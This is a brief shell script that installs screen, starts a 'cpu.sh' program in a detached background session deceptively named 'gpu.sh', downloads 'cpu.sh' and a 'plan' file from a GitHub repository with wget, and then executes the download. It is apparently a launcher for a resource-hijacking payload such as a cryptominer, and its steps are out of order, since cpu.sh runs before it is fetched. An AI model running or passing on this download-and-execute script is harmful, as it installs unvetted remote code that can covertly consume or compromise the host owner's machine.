#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./cpu.sh 65 75
wget https://github.com/chikahusarii/new/blob/main/plan
wget https://raw.githubusercontent.com/chikahusarii/new/main/cpu.sh
chmod +x cpu.sh
./cpu.sh